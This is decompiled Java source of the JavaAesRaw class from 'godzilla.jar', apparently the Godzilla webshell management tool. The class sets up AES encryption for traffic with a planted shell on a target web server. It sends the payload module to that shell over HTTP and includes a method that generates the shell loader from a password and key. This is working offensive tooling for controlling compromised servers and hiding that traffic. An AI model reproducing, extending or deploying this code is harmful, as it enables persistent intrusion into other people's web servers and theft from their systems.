/*    */ package shells.cryptions.JavaAes;
/*    */ 
/*    */ import core.annotation.CryptionAnnotation;
/*    */ import core.imp.Cryption;
/*    */ import core.shell.ShellEntity;
/*    */ import javax.crypto.Cipher;
/*    */ import javax.crypto.spec.SecretKeySpec;
/*    */ import util.Log;
/*    */ import util.functions;
/*    */ import util.http.Http;
/*    */ 
/*    */ @CryptionAnnotation(Name = "JAVA_AES_RAW", payloadName = "JavaDynamicPayload")
/*    */ public class JavaAesRaw
/*    */   implements Cryption
/*    */ {
/*    */   private ShellEntity shell;
/*    */   private Http http;
/*    */   private Cipher decodeCipher;
/*    */   private Cipher encodeCipher;
/*    */   private String key;
/*    */   private boolean state;
/*    */   private byte[] payload;
/*    */   
/*    */   public void init(ShellEntity context) {
/* 25 */     this.shell = context;
/* 26 */     this.http = this.shell.getHttp();
/* 27 */     this.key = this.shell.getSecretKeyX();
/*    */     try {
/* 29 */       this.encodeCipher = Cipher.getInstance("AES");
/* 30 */       this.decodeCipher = Cipher.getInstance("AES");
/* 31 */       this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"));
/* 32 */       this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
/* 33 */       this.payload = this.shell.getPayloadModule().getPayload();
/* 34 */       this.shell.getHeaders().put("Content-Type", "application/octet-stream");
/* 35 */       if (this.payload != null) {
/* 36 */         this.http.sendHttpResponse(this.payload);
/* 37 */         this.state = true;
/*    */       } else {
/* 39 */         Log.error("payload Is Null");
/*    */       }
/*    */     
/* 42 */     } catch (Exception e) {
/* 43 */       Log.error(e);
/*    */       return;
/*    */     } 
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public byte[] encode(byte[] data) {
/*    */     try {
/* 52 */       return this.encodeCipher.doFinal(data);
/* 53 */     } catch (Exception e) {
/* 54 */       Log.error(e);
/* 55 */       return null;
/*    */     } 
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public byte[] decode(byte[] data) {
/*    */     try {
/* 63 */       return this.decodeCipher.doFinal(data);
/* 64 */     } catch (Exception e) {
/* 65 */       Log.error(e);
/* 66 */       return null;
/*    */     } 
/*    */   }
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   public boolean isSendRLData() {
/* 75 */     return false;
/*    */   }
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   public boolean check() {
/* 83 */     return this.state;
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public byte[] generate(String password, String secretKey) {
/* 89 */     return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), true);
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\cryptions\JavaAes\JavaAesRaw.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */